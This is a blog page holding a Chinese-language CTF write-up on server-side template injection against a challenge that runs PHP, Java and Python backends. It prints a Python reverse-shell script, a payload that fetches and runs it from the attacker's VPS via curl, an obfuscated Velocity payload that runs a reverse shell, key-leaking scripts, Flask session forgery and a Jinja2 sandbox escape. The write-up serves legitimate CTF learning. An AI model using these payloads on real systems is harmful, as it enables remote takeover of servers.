@@ -1,0 +1,752 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="K1nm0">
+  <meta name="keywords" content="Security">
+  
+    <meta name="description" content="服务器模版注入的CTF题目。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mimic-ssti_writeup">
+<meta property="og:url" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/index.html">
+<meta property="og:site_name" content="洞爷湖">
+<meta property="og:description" content="服务器模版注入的CTF题目。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220318204301527.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220318205757458.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220318205936252.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/mimic-ssti.jpg">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319204919908.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319205729662.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319205904127.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319210107587.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319210415208.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319210612610.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319210848354.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319210800207.png">
+<meta property="og:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220319211051166.png">
+<meta property="article:published_time" content="2022-03-18T12:26:49.000Z">
+<meta property="article:modified_time" content="2022-10-24T01:26:46.310Z">
+<meta property="article:author" content="K1nm0">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/image-20220318204301527.png">
+  
+  
+  
+  <title>Mimic-ssti_writeup - 洞爷湖</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"k1nm0.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":120,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"enable","follow_dnt":true,"baidu":"c274d8260883201e6d0377b9f78ad60f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?c274d8260883201e6d0377b9f78ad60f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>洞爷湖</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wallpaper.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mimic-ssti_writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-18 20:26" pubdate>
+          2022年3月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Mimic-ssti_writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0x01-什么是SSTI">0x01 什么是SSTI</h2>
+<p>SSTI就是服务器端模板注入(Server-Side Template Injection)，服务器接收用户命令，然后后端对命令渲染，将恶意代码作为Web模板的一部分，和其他注入（XSS等）比较类似。常见于Python环境。</p>
+<div class="note note-info">
+            <p>相关知识参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96480967">(16条消息) SSTI完全学习_大千SS的博客-CSDN博客_ssti</a></p><p><a target="_blank" rel="noopener" href="https://www.wangan.com/articles/1031">CTF 中常见 Python 题型 SSTI - 网安 (wangan.com)</a></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/105322894?utm_term=ssti%E6%B3%A8%E5%85%A5&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-105322894&amp;spm=3001.4430">(16条消息) SSTI模板注入_Sn0w/的博客-CSDN博客_模板注入</a></p>
+          </div>
+<p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p>
+<h2 id="0x02-PHP">0x02 PHP</h2>
+<p>打开题目，只有一个搜索框。用HackBar简单执行一下python的payload，在自己的VPS上开指定端口，发现有请求访问，说明存在注入：</p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220318204301527.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p>能访问就好说了，<a target="_blank" rel="noopener" href="http://xn--VPSpyrev-209lgd7qs43ggstekdjw8a4nfu69e92ybthd.py">在自己的VPS上新建一个py脚本rev.py</a>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,subprocess,os<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((your_vps_ip,vps_port))<br>os.dup2(s.fileno(),<span class="hljs-number">0</span>)       <br>os.dup2(s.fileno(),<span class="hljs-number">1</span>)       <br>os.dup2(s.fileno(),<span class="hljs-number">2</span>)       <br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br></code></pre></td></tr></table></figure>
+<p>新建一个vps的shell，用nc监听脚本预设的端口，然后让目标机器反弹shell：</p>
+<p><code>http://eci-2ze7xhzqb362wx6m2wqs.cloudeci1.ichunqiu.com:8888/?username=&#123;system('curl -l http://your_vps_ir:port/rev.py | python3 ')&#125;</code></p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220318205757458.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p>在根目录下找到flag，但是只有php的可以读取：</p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220318205936252.png" srcset="/img/loading2.gif" lazyload alt></p>
+<h2 id="0x03-Java">0x03 Java</h2>
+<p>本来想用php的shell进python目录上传一句话拿shell的，结果发现没有权限……只能通过curl上传文件获得java目录里的jar文件源码。</p>
+<p>打开源码后发现黑名单，可以针对黑名单进行绕过：</p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/mimic-ssti.jpg" srcset="/img/loading2.gif" lazyload alt="img"></p>
+<p>构造payload获取java的shell，需要注意的是，如果你这里也是用curl来反弹shell的话，要把监听php那个shell先退出才能收到java的shell：</p>
+<p><code>%23set($e%3d&quot;e&quot;)%0a%23set($j%3d&quot;jav&quot;)%0a%23set($a%3d&quot;a.lang.Ru&quot;)%0a%23set($R%3d&quot;ntime&quot;)%0a%23set($g%3d&quot;getR&quot;)%0a%23set($t%3d&quot;untime&quot;)%0a$e.getClass().forName($j.concat($a).concat($R)).getDeclaredMethod($g.concat($t),null).invoke(null,null).exec(&quot;bash+-c+&#123;echo,这里是getshell的base64语句&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</code></p>
+<p>执行语句后收到java部分的flag：</p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319204919908.png" srcset="/img/loading2.gif" lazyload alt></p>
+<h2 id="0x04-Python">0x04 Python</h2>
+<p><a target="_blank" rel="noopener" href="http://xn--pythonapp-5b6ns32chr6aq86dlhbm89o.py">读取python目录下的app.py</a>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, render_template_string<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> uuid<br><br>app = Flask(__name__)<br>SECRET_KEY = <span class="hljs-built_in">str</span>(uuid.uuid4())[:<span class="hljs-number">12</span>]<br>numbers_str = [<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br>black_list = [<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&quot;request&quot;</span>, <span class="hljs-string">&quot;&#123;%&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&#x27;lipsum&#x27;</span>, <span class="hljs-string">&#x27;url_for&#x27;</span>,<br>              <span class="hljs-string">&#x27;get_flashed_messages&#x27;</span>, <span class="hljs-string">&#x27;range&#x27;</span>, <span class="hljs-string">&#x27;dict&#x27;</span>, <span class="hljs-string">&#x27;joiner&#x27;</span>]<br>black_list += numbers_str<br><br>app.config.update(<span class="hljs-built_in">dict</span>(<br>    SECRET_KEY=SECRET_KEY,<br>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> name.lower():<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    <span class="hljs-keyword">if</span> name <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        text1 = requests.get(<span class="hljs-string">&quot;http://127.0.0.1:7410/&quot;</span>, params=&#123;<span class="hljs-string">&quot;username&quot;</span>: name&#125;).text<br>        text2 = requests.get(<span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>, params=&#123;<span class="hljs-string">&quot;username&quot;</span>: name&#125;).text<br>        <span class="hljs-keyword">if</span> waf(name):<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>), <span class="hljs-number">404</span><br>        render_str = render_template_string(name)<br>        <span class="hljs-keyword">if</span> text1 == render_str <span class="hljs-keyword">and</span> text2 == render_str:<br>            <span class="hljs-keyword">return</span> render_str<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>), <span class="hljs-number">404</span><br>        render_str = render_template_string(name)<br>        <span class="hljs-keyword">return</span> render_str<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>), <span class="hljs-number">404</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure>
+<p>发现SECRET_KEY是随机产生的，而且过滤了数字和字符串拼接，所以这里可以利用伪造session来进行构造任意字符串。</p>
+<p>这里可以通过伪造php和java的服务来本地比较得到key。</p>
+<p>leak.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//leak.php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>))&#123;<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>);<br>&#125;<br><span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;-0123456789abcdef&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;username&quot;</span>],<span class="hljs-string">&#x27;code&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;username&quot;</span>][<span class="hljs-number">0</span>],FILE_APPEND);<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-variable">$tmp_code</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>);<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$tmp_code</span>;<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>,<span class="hljs-variable">$code</span>[(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-variable">$tmp_code</span>)+<span class="hljs-number">1</span>)%<span class="hljs-number">17</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://leak.py">leak.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#leak.py</span><br>url=<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span><br>code=<span class="hljs-string">&quot;-0123456789abcdef&quot;</span><br>f=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>   cut = (<span class="hljs-number">11</span>-x)*<span class="hljs-string">&#x27;-config.JSON_SORT_KEYS&#x27;</span><br>   leak_temp = <span class="hljs-string">&quot;&#123;&#123;config.SECRET_KEY[config.JSONIFY_MIMETYPE.index(config.APPLICATION_ROOT)&quot;</span>+cut+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>   <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> code:<br>       text=requests.get(url,params=&#123;<span class="hljs-string">&quot;username&quot;</span>:leak_temp&#125;).text<br>       <span class="hljs-comment">#print(text)</span><br>       <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&gt;404&lt;&quot;</span> <span class="hljs-keyword">in</span> text:<br>           <span class="hljs-keyword">pass</span><br>       <span class="hljs-keyword">else</span>:<br>           requests.get(url,params=&#123;<span class="hljs-string">&quot;username&quot;</span>:y+<span class="hljs-string">&quot;code&quot;</span>&#125;)<br>           f+=y<br>           <span class="hljs-built_in">print</span>(f)<br>           <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<p>然后在php的shell里kill掉php服务，之后退出shell；再在java的shell里kill掉java进程。再把上面的leak.php写入到tmp下，把leak.py写到vps的目录下。</p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319205729662.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319205904127.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210107587.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p><a target="_blank" rel="noopener" href="http://xn--vpsleak-iw3kp19dkqpgy7dou2admru7x.py">在自己的vps上运行leak.py</a>：</p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210415208.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p>然后利用爆破出的key伪造session：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&quot;8a8cf74c-0d2&quot;</span><br><br>session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>   a=&#123;<span class="hljs-string">&quot;cs&quot;</span>:<span class="hljs-string">&quot;__class__&quot;</span>,<span class="hljs-string">&quot;bs&quot;</span>:<span class="hljs-string">&quot;__base__&quot;</span>,<span class="hljs-string">&quot;sub&quot;</span>:<span class="hljs-string">&quot;__subclasses__&quot;</span>,<span class="hljs-string">&quot;num&quot;</span>:<span class="hljs-number">190</span>,<span class="hljs-string">&quot;it&quot;</span>:<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;gb&quot;</span>:<span class="hljs-string">&quot;__globals__&quot;</span>,<span class="hljs-string">&quot;bt&quot;</span>:<span class="hljs-string">&quot;__builtins__&quot;</span>,<span class="hljs-string">&quot;el&quot;</span>:<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /python_flag &gt; /tmp/python_flag&#x27;).read()&quot;</span>&#125;<br>   <span class="hljs-built_in">print</span>(session_serializer.dumps(a))<br><br>index()<br></code></pre></td></tr></table></figure>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210612610.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p>构造python模板的poc：</p>
+<p><code>&#123;&#123;(cycler[session.cs]|attr(session.bs))[session.sub]()[session.num][session.it][session.gb][session.bt][session.el](session.cmd)&#125;&#125;</code></p>
+<p>在header头里添加cookie字段伪造得到的session，发送数据包即可在tmp目录下找到python_flag：</p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210848354.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319210800207.png" srcset="/img/loading2.gif" lazyload alt></p>
+<h2 id="0x05-Getflag">0x05 Getflag</h2>
+<p>三段拼接即可得到flag，提交完事：</p>
+<p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319211051166.png" srcset="/img/loading2.gif" lazyload alt></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="category-chain-item">学习</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/CTF/WEB/" class="category-chain-item">WEB</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mimic-ssti_writeup</div>
+      <div>https://k1nm0.com/2022/03/18/Mimic-ssti-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>K1nm0</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年3月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/02/FofaHacking/" title="Fofa_Hacking">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Fofa_Hacking</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
